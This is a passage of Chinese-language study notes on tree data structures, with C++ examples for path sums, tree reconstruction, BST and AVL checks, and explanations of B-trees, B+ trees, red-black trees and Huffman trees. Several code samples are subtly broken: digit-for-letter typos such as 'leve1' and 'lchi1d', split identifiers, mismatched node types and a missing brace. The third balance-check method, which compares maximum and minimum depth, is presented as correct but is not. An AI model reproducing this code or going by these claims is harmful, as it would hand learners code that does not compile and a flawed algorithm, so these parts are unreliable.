class="title">GetMaxDistance</span> <span class="params">(BTNode* root)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!root) &#123;</span><br><span class="line">RESULT empty = &#123; <span class="number">0</span>, <span class="number">-1</span> &#125;; <span class="comment">/*最大深度初始化为-1是因为调用者要对其加1，然后变为0，使得无子树的最大深度为0*/</span></span><br><span class="line"><span class="keyword">return</span> empty;</span><br><span class="line">    &#125;</span><br><span class="line">RESULT lhs = <span class="built_in">GetMaxDistance</span> (root-&gt;left);</span><br><span class="line">RESULT rhs = <span class="built_in">GetMaxDistance</span> (root-&gt;right);</span><br><span class="line">RESULT result;</span><br><span class="line">result.MaxDepth = <span class="built_in">max</span> (lhs.MaxDepth+<span class="number">1</span>, rhs.MaxDepth+<span class="number">1</span>);   <span class="comment">// 树的最大深度</span></span><br><span class="line">result.MaxDistance = <span class="built_in">max</span> (<span class="built_in">max</span>(lhs.MaxDistance, rhs.MaxDistance),   <span class="comment">// 情况B</span></span><br><span class="line">                              lhs.MaxDepth+rhs.MaxDepth+<span class="number">2</span>);    <span class="comment">// 情况A</span></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><em>一棵二叉树每个结点包含一个整数，请设计一个算法输出所有满足条件的路径：此路径上的所有结点之和等于给定值。注意此类路径不要求必须从根结点开始，满足条件的路径不唯一。</em></p></blockquote><p>该题可利用先序遍历：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printbuffer</span> <span class="params">(vector&lt;<span class="type">int</span>&gt; buffer, <span class="type">int</span> level, <span class="type">int</span> i2)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=level; i &lt;= i2; i++) &#123;</span><br><span class="line">cout&lt;&lt;buffer[i] &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">findSum</span> <span class="params">(BTNode* head, <span class="type">int</span> sum, vector&lt;<span class="type">int</span>&gt; buffer, <span class="type">int</span> level)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;  <span class="comment">//默认void</span></span><br><span class="line">    <span class="type">int</span> tmp = sum;</span><br><span class="line">    buffer.<span class="function">push_ <span class="title">back</span><span class="params">(head-&gt;val)</span></span>;      <span class="comment">// 当前结点加入buffer</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=level; i &gt; <span class="number">-1</span>; i--) &#123;   <span class="comment">// 减去buffer中已有元素</span></span><br><span class="line">    tmp -= buffer[i];</span><br><span class="line">    <span class="keyword">if</span>(tmp == <span class="number">0</span>)   <span class="comment">// 找到路径</span></span><br><span class="line">    <span class="built_in">printbuffer</span>(buffer, i, level);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">findSum</span>(head-&gt;left, sum, buffer, leve1+<span class="number">1</span>);   <span class="comment">// 深度level加1（buffer大小加1），继续遍历左孩子结点</span></span><br><span class="line">    <span class="comment">// 回溯到当前结点，然后继续遍历右孩子结点</span></span><br><span class="line">    buffer.<span class="built_in">pop_back</span>();</span><br><span class="line">    level -= <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">findSum</span> (head-&gt;right, sum, buffer, level+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol start="4"><li><em><strong>由遍历序列构造二叉树（重建二叉树）</strong></em></li></ol></blockquote><p><u>在先序遍历序列中，第一个结点一定是二叉树的根结点</u>，而<u>在中序遍历中，根结点必然将中序序列分割成两个子序列</u>，前一个子序列就是根结点的左子树的中序序列，后一个子序列是根结点的右子树的中序序列。<u>根据这两个子序列，可以在先序序列中找到对应的左子序列和右子序列。</u>在先序序列中，左子序列的第一个结点是左子树的根结点，右子序列的第一个结点是右子树的根结点。如此递归地进行下去，便能唯一地确定这棵二叉树。即<strong>先序序列和中序序列可以唯一地确定一棵二叉树。</strong></p><p>同理，由二叉树的<strong>后序序列和中序序列也可以唯一地确定一棵二叉树</strong>，因为后序序列的最后一个结点就如同先序序列的第一个结点， 可以将中序序列分割成两个子序列，然后采用类似的方法递归地进行划分，就可以得到一棵二叉树。</p><p>由二叉树的<strong>层序序列和中序序列也可以唯一地确定一棵二叉树</strong>。需要注意的是，<strong>如果只知道二叉树的先序序列和后序序列，是无法唯一确定一棵二叉树的。</strong></p><blockquote><p>例1：求先序序列（ABCDEFGHI）和中序序列（BCAEDGHFI）所确定的二叉树。</p></blockquote><p>由先序序列确定根结点，再由中序序列确定该根结点的左子树、右子树。再依次递归下去。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220715101328300.png" alt="image-20220715101328300"></p><blockquote><p>例2：输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1, 2, 4, 7, 3, 5, 6, 8}和中序遍历序列{4, 7, 2, 1, 5, 3, 8, 6}，则重建二叉树并输出它的后序遍历序列。(剑指Offer例题)</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *left;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *right;</span><br><span class="line">&#125;BTNode;</span><br><span class="line"></span><br><span class="line"><span class="function">BTNode *<span class="title">CreatBT1</span><span class="params">(<span class="type">char</span> *pre, <span class="type">char</span> *in, <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="comment">// pre存放先序序列，in存放中序序列，n为二叉树的结点个数，返回构造的二叉树的根结点指针b</span></span><br><span class="line">    BTNode *b;</span><br><span class="line">    <span class="type">char</span> *p;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    b = <span class="keyword">new</span> <span class="built_in">BTNode</span>();</span><br><span class="line">    b-&gt;val = *pre;   <span class="comment">// 根结点</span></span><br><span class="line">    <span class="keyword">for</span>(p=in;p&lt;in+n;p++)&#123;   <span class="comment">// 在中序序列中寻找根结点pre</span></span><br><span class="line">        <span class="keyword">if</span>(*p == *pre)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    k = p-in;    <span class="comment">// 确定根结点在中序序列in中的位置k，也是左子树的序列长度</span></span><br><span class="line">    b-&gt;left = <span class="built_in">CreatBT1</span>(pre+<span class="number">1</span>, in, k);    <span class="comment">// 递归构造左子树，pre+1和in均指向左子树序列的开头</span></span><br><span class="line">    b-&gt;right = <span class="built_in">CreatBT1</span>(pre+k+<span class="number">1</span>, p+<span class="number">1</span>, n-k<span class="number">-1</span>);  <span class="comment">// 递归构造右子树，pre+k+1和p+1均指向右子树列的开头</span></span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-树的应用"><a href="#3-4-树的应用" class="headerlink" title="3.4 树的应用"></a>3.4 树的应用</h3><h4 id="二叉排序树-BST"><a href="#二叉排序树-BST" class="headerlink" title="二叉排序树 BST"></a>二叉排序树 BST</h4><p>二叉排序树，也称为二叉查找树，二叉搜索树，或BST。二叉排序树或者是一棵<u>空树</u>，或者是一棵具有下列特性的非空二 叉树：</p><ol><li><p>若左子树非空，则左子树上所有结点关键字值均<u>小于</u>根结点的关键字值。</p></li><li><p>若右子树非空，则右子树上所有结点关键字值均<u>大于</u>根结点的关键字值。</p></li><li><p><u>左、右子树本身也分别是一棵二叉排序树</u>。</p></li></ol><p>由此定义可知，二叉排序树是一个递归的数据结构。</p><p>根据二叉排序树的定义，有**左子树结点值 &lt; 根结点值 &lt; 右子树结点值**。所以对二叉排序树<u>进行中序遍历，可以得到一个递增的有序序列</u>。</p><p>二叉排序树的查找操作的时间复杂度是$O(log_2N)$，比较次数与树的深度有关。</p><p>例如，图13-5的二叉排序树的中序遍历序列为123468。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220715150035730.png" alt="image-20220715150035730"></p><blockquote><p>判断一个二叉树是否为二叉排序树</p></blockquote><p>使用中序遍历二叉树，判断是否为递增序列，复杂度O(n)。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> prev1 = INT_ MIN; <span class="comment">//定义为最小的整数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *lchild, *rchild;</span><br><span class="line">&#125;BTNode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">JudgeBST</span> <span class="params">(BTNode *bt)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> b1, b2;</span><br><span class="line"><span class="keyword">if</span>(bt == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 中序遍历</span></span><br><span class="line">b1 = <span class="built_in">JudgeBST</span> (bt-&gt;lchi1d);</span><br><span class="line"><span class="keyword">if</span>(b1 == <span class="number">0</span> || bt-&gt;val &lt;= prev1) <span class="comment">// 左子树不是二叉排序树，或者根结点值不大于prev1</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">prev1 = bt-&gt;val;   <span class="comment">// 更新prev1为根结点的值，即右子树的所有结点值均要大于prev1</span></span><br><span class="line">b2 = <span class="built_in">JudgeBST</span> (bt-&gt;rchild);</span><br><span class="line"><span class="keyword">return</span> b2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="平衡二叉树-AVL"><a href="#平衡二叉树-AVL" class="headerlink" title="平衡二叉树 AVL"></a>平衡二叉树 AVL</h4><p>为了避免树的高度增长过快，降低二叉排序树的性能，我们规定在插入和删除二叉树结点时，要<u>保证任意结点的左、右子树高度差的绝对值不超过1</u>，并将这样的<u>二叉排序树</u>称为<strong>平衡二叉树</strong>，简称平衡树(AVL树)。<u>定义结点左子树与右子树的高度差为该结点的<strong>平衡因子</strong></u>，则平衡二叉树结点的平衡因子的值只可能是-1、0或1。</p><p>因此，平衡二叉树可定义为它或者是一棵<u>空树</u>，或者是具有下列性质的二叉树：它的左子树和右子树都是平衡二叉树，且 <strong>左子树和右子树的高度差的绝对值不超过1</strong>。</p><p>平衡二叉树的操作效率（查询，插入，删除）效率较高，时间复杂度是$O(log_2N)$，即树的深度。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220715150213734.png" alt="image-20220715150213734"></p><p>图13-6(b)所示是不平衡的二叉树。结点中的值为该结点的平衡因子。</p><blockquote><p>判断一棵二叉树是不是平衡二叉树。</p></blockquote><p><strong>解法一</strong>：递归的思路，遍历树的每个结点，求出其左右子树的深度，计算深度差。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">IsBalanced</span> <span class="params">(BTNode* root)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">    <span class="type">int</span> left_Depth = <span class="built_in">BTHeight</span> (root-&gt;left) ;</span><br><span class="line">    <span class="type">int</span> right_Depth = <span class="built_in">BTHeight</span> (root-&gt;right) ;</span><br><span class="line">    <span class="type">int</span> diff = left_Depth - right_Depth;</span><br><span class="line"><span class="keyword">if</span>(diff &gt; <span class="number">1</span> || diff &lt; <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">IsBalanced</span> (root-&gt;left) &amp;&amp; <span class="built_in">IsBalanced</span> (root-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解法二</strong>：解法一虽然简洁但是每个结点会被遍历多次，效率较低。如果我们用后序遍历的方式遍历二叉树的每一个结点， 在遍历到一个结点之前我们已经遍历了它的左右子树。只要在遍历每个结点的时候记录它的高度，我们就可以一边遍历一边判断每个结点是不是平衡的。下面是这种思路的参考代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">IsBalanced</span> <span class="params">(BTNode* root, <span class="type">int</span>* Depth)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">*Depth=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="type">int</span> left_Depth, right_Depth;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsBalanced</span> (root-&gt;left, &amp;left_Depth) &amp;&amp; <span class="built_in">IsBalanced</span> (root-&gt;right, &amp;right_Depth)) &#123;</span><br><span class="line"><span class="type">int</span> diff=left_Depth - right_Depth;</span><br><span class="line"><span class="keyword">if</span>(diff &lt;= <span class="number">1</span> &amp;&amp; diff&gt;= <span class="number">-1</span>)&#123;</span><br><span class="line">*Depth = <span class="number">1</span> + (left_Depth &gt; right_Depth ? left_Depth : right_Depth);  <span class="comment">// 取左右子树中深度的最大值</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解法三</strong>：除此之外，下面的方法也是可行的，且形式更加简洁。<u>求出根结点的最大深度与最小深度</u>，则最大深度与最小深度之差dis就是树中任一子树深度差最大值，所以<u>只要dis小于等于1，此树就是平衡二叉树</u>，代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 求树的最大深度</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxDepth</span> <span class="params">(BTNode* root)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span> + <span class="built_in">max</span> (<span class="built_in">maxDepth</span>(root-&gt;left), <span class="built_in">maxDepth</span>(root-&gt;right));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 求树的最小深度</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">minDepth</span> <span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> + <span class="built_in">min</span> (<span class="built_in">minDepth</span>(root-&gt;left), <span class="built_in">minDepth</span>(root-&gt;right)) ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 计算根结点的最大深度与最小深度之差，小于等于1就说明是平衡二叉树</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isBalanced</span> <span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">maxDepth</span>(root) - <span class="built_in">minDepth</span>(root) &lt;= <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="B树和B-树"><a href="#B树和B-树" class="headerlink" title="B树和B+树"></a>B树和B+树</h4><p>参考：<a href="https://www.cnblogs.com/xiaofengshan/p/15443140.html">https://www.cnblogs.com/xiaofengshan/p/15443140.html</a></p><p>B树和B+树都是多路查找树，为了解决数据量大，树的高度大增（二叉树）而产生的一种数据结构。</p><p><strong>B树</strong></p><p>B树又称为<strong>多路平衡查找树</strong>，是二叉排序树的扩展，满足平衡的性质，<u>所有结点的平衡因子均等于0</u>，结点又拥有多个子树，对于组织和维护外存文件系统非常有效（数据库）。</p><p>把树中结点所拥有的最大的子树数目称为 <strong>B树的阶</strong>。通常记为m。一颗m阶B树或为空树，或为满足如下特性的m叉树：</p><ul><li>树中<u>每个结点至多有m个孩子结点</u>。（同时<u>至多含有m-1个关键字</u>，每两颗子树指针夹着一个关键字)；</li><li><u>若根结点不是叶子结点，则至少有两个孩子结点</u>。(至少一个关键字)；</li><li><u>除根结点外的所有非叶子结点至少有$\lceil m&#x2F;2 \rceil$棵子树</u>。（即至少含有$\lceil m&#x2F;2 \rceil -1$个关键字）；</li><li><u>所有的外部结点出现在同一个层次上</u>，不带信息，但是计算B树的高度时需要考虑外部结点。(就像是折半查找判断树中查找失败的结点）。</li><li>**<u>每一个结点中的关键字按递增的顺序排列</u>**，关键字两边为指向孩子结点的指针。</li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220722103219609.png" alt="image-20220722103219609"></p><p>B树中的非叶子结点对应数据库查找时的关键字，叶子结点对应要查找的详细记录，而外部结点对应查找失败，指向它的指针为NULL，不含有任何信息。一颗含有n个关键字的B树有n+1个外部结点。</p><ul><li><p><strong>B树的插入</strong></p><p>向B树插入结点时，只能向叶子结点插入。</p><p>当叶子结点的关键字个数小于m-1时，直接在该结点增加关键字即可，注意保持递增。</p><p>当叶子结点的关键字个数等于m-1时，无法继续增加关键字。这时采用 <strong>分裂法</strong>，比如一棵3阶B树，结点的关键字个数最多为2。有一关键字为50的结点需要插入，定位到在叶子节点{20、30}中插入时，发现关键字已满。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1878829-20211023171456763-1075232344.png" alt="image"><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1878829-20211023171704347-889107402.png" alt="image"></p><p>此时对该叶子结点进行分裂，选取{20、30、50}的中位数30作为双亲结点提升到上一层中，其余关键字作为孩子结点留在本层。若关键字30提升到双亲结点后，造成双亲结点的关键字数量超过m-1，那么双亲结点也进行同样的分裂。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1878829-20211023172041053-21577706.png" alt="image"></p></li><li><p><strong>B树的删除</strong></p><p>删除关键字时，同样也要考虑结点内原本关键词的数量，<strong>保证结点始终拥有至少$\lceil m&#x2F;2 \rceil$-1个关键字</strong>：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1878829-20211023175004402-1855562437.png" alt="image"></p><ul><li><p>当结点内关键字数量大于$\lceil m&#x2F;2 \rceil$-1，这时删除这个关键字不会破坏B树的定义要求，所以直接删除即可。</p><p>比如删除关键字9；</p></li><li><p>当结点内关键字数量等于$\lceil m&#x2F;2 \rceil$-1，并且其左右兄弟结点中存在关键字数量大于$\lceil m&#x2F;2 \rceil$-1的结点，则删除后 <strong>去兄弟结点中借关键字</strong>；</p><p>比如删除关键字2，而每个结点应至少有1个关键字，所以结构调整子树结构为根结点为5，7为左孩子，9为右孩子。</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1878829-20211023175630640-1755597084.png" alt="image"></p><ul><li><p>当结点内关键字数量等于$\lceil m&#x2F;2 \rceil$-1，并且其左右兄弟结点中不存在关键字数量大于$\lceil m&#x2F;2 \rceil$-1的结点，则需要 <strong>进行结点合并</strong>；</p><p>比如删除关键字16后，无法向兄弟结点借关键字，所以调整子树结构为如下：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1878829-20211023180238546-719277151.png" alt="image"></p></li></ul><p>如果删除的关键字不在终端结点上（最底层非叶子结点）：需要先转换成在终端结点上（找相邻关键字替换），再按照在终端结点上的情况来分别考虑对应的方法。</p></li></ul><p><strong>B+树</strong></p><p>B+树是B树的一些变形，是常用于数据库和操作系统的文件系统中的一种用于查找的数据结构，包括oracle、Mysql等主流数据库。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220722152447901.png" alt="image-20220722152447901"></p><p><strong>B+树的性质：</strong></p><ul><li><u>m阶B+树的每个分支结点至多有m个子树</u>，不用来保存数据而是保存数据的索引。</li><li><u>除根结点外的所有非叶子结点至少有$\lceil m&#x2F;2 \rceil$棵子树</u>。根结点要么没有子树，要么至少有2个子树。</li><li><u><strong>有n棵子树的结点恰好有n个关键字。</strong></u></li><li>**<u>所有的叶子结点中包含了全部关键字的信息</u>**，及指向含这些关键字记录的指针，且叶子结点本身依关键字的大小自小而大顺序链接。非叶子结点的元素在叶子结点上有冗余，<u>非叶子结点的数据只是作为索引来帮助查找叶子结点元素</u>。</li><li>所有的非终端结点可以看成是索引部分，结点中仅含其子树中的大（或小）关键字。</li><li>B+树中，数据对象的插入和删除仅在叶节点上进行。</li><li>B+树**<u>有2个头指针</u><strong>，一个是树的根节点root（用于随机查找），一个是小关键码的叶节点指针sqt（用于顺序查找&#x2F;范围查找）。且</strong><u>叶子结点之间有指针</u>**。</li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220722165630558.png" alt="image-20220722165630558"></p><p>Mysql索引使用的是B+树，因为索引（非叶子结点）是用来加快查询的。同时而B+树通过对数据进行排序，所以是可以提高查询速度的，并且一个结点中可以存储多个元素，从而可以使得B+树的高度不会太高。</p><p>在Mysql中一个Innodb页就是一个B+树结点，一个Innodb页默认16kb（存储本结点关键字），所以一般情况下一棵两层的B+树可以存2000万行左右的数据（B+树一般不会超过3层），然后通过利用B+树叶子结点存储了所有数据并且进行了排序，并且叶子结点之间有指针，可以很好的支持全表扫描，范围查找等SQL语句。</p><p><strong>B树和B+树的区别：</strong></p><p>① 在B+树中，具有n个关键字的结点只含有n棵子树，即每个关键字对应一颗子树；而在B树中，具有n个关键字的结点含有(n+1)棵子树。<br>② 在B+树中，每个结点(非根内部结点)关键字个数n的范围是[m&#x2F;2]&lt;&#x3D;n&lt;&#x3D;m(根结点1&lt;&#x3D;n&lt;&#x3D;m),在B树中，每个结点(非根内部结点)关键字个数n的范围是[m&#x2F;2]-1&lt;&#x3D;n&lt;&#x3D;m-1(根结点:1&lt;&#x3D;n&lt;&#x3D;m-1)。<br>③ 在B+树中，叶结点包含信息，所有非叶结点仅起到索引的作用，非叶结点中的每个索引项只含有对应子树的最大关键字和指向该子树的指针，不含有该关键字对应的存储地址。<br>④ 在B+树中，叶结点包含了全部关键字，即在非叶结点中出现的关键字也会出现在叶结点中；而在B树中，叶结点包含的关键字和其他结点包含的关键字是不重复的。<br>⑤ 在B+树中，有一个指针指向关键字最小的叶子结点，所有叶子结点连接成一个单链表。</p><h4 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h4><p>参考：<a href="https://blog.csdn.net/cy973071263/article/details/122543826">https://blog.csdn.net/cy973071263/article/details/122543826</a></p><ul><li><p><strong>背景</strong></p><p>若插入和删除操作总在平衡二叉树（AVL）的某一子树进行，那么大多数的结点都会在根结点的右侧或左侧，此时，二叉搜索树就接近于一个链表，它的操作效率就降低了。为了不断维持平衡二叉树的平衡状态，就需要对AVL进行旋转处理。红黑树的出现是为了解决维持平衡二叉树AVL而导致的成本高的问题。</p><p>比如下面进行平衡二叉树的插入时，就需要进行旋转，重新维持平衡。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220715162620468.png" alt="image-20220715162620468"></p></li><li><p><strong>概念</strong></p><p>自平衡二叉查找树，以前也叫平衡二叉B树。红黑树具有良好的效率，它可在 O(logN) 时间内完成查找、增加、删除等操作。</p><p>红黑树为具备了某些特性的<u><strong>二叉搜索树</strong></u>，能解决非平衡树问题，是一种**<u>接近平衡</u>**的二叉树（说它是接近平衡因为它并没有像AVL树的平衡因子的概念，它只是靠着满足红黑节点的5条性质来维持一种接近平衡的结构，进而提升整体的性能，并没有严格的卡定某个平衡因子来维持绝对平衡）。红黑树同时具有平衡和排序的特点，既接近平衡二叉树，又是二叉搜索树BST。</p></li><li><p><strong>性质</strong></p><p><u>首先，红黑树是一个二叉搜索树</u>，它在每个结点增加了一个存储位记录节点的颜色，可以是RED，也可以是BLACK；<u>通过任意一条从根到叶子简单路径上颜色的约束，红黑树保证最长路径不超过最短路径的二倍，因而近似平衡</u>（最短路径就是全黑节点，最长路径就是一个红结点一个黑结点，当从根结点到叶子结点的所有路径上黑色结点数目相同时，最长路径刚好是最短路径的两倍）。它同时满足以下特性：</p><ul><li>结点是红色或黑色</li><li>根是黑色</li><li>叶子结点（外部结点，空结点）都是黑色</li><li>红色结点的子结点都是黑色，红色结点的父结点都是黑色，从根结点到叶子结点的所有路径上不能有 2 个连续的红色结点</li><li>从任一结点到叶子结点（空结点）的所有路径都包含相同数目的黑色结点</li></ul></li></ul><h4 id="哈夫曼树及哈夫曼编码"><a href="#哈夫曼树及哈夫曼编码" class="headerlink" title="哈夫曼树及哈夫曼编码"></a>哈夫曼树及哈夫曼编码</h4><ul><li><p>概念</p><p><strong>结点的权值</strong>：给树的结点赋予的有某种意义的数值；</p><p><strong>结点的带权路径长度WPL</strong>：从根结点到该结点之间的路径长度与该结点的权值的乘积；</p><p><strong>树的带权路径长度WPL</strong>：树中所有叶子结点的带权路径长度之和，记为$WPL&#x3D;\sum_{i&#x3D;1}^n{w_i*l_i}$。式中，$w_i$是第i个叶结点所带的权值，$l_i$是该叶结点到根结点的路径长度。</p><p><strong>哈夫曼树</strong>：在$n_0$个带权叶子节点构成的所有二叉树中，带权路径长度WPL最小的二叉树称为哈夫曼树。（原则：权值越大的叶子结点越靠近根结点，权值越小的叶子结点越远离根结点）</p></li><li><p>哈夫曼树的构造</p><p>给定n个权值分别为$w_1$，$w_2$，…，$w_n$的结点。构造哈夫曼树的算法描述如下:</p><ol><li>将这n个结点分别作为n棵仅含一个结点的二叉树，构成森林F。</li><li>从F中选取两棵根结点权值最小的树作为左、右子树来构造一个新二叉树，并且将新二叉树根结点的权值置为左、右子树上根的权值之和。</li><li>从F中，用新得到的树代替刚才选出的两棵树。</li><li>重复步骤2)和3)，直至F中只剩下一棵树为止。</li></ol></li></ul><img src="/posts/Users/cbcao/AppData/Roaming/Typora/typora-user-images/image-20220715165325637.png" alt="image-20220715165325637" 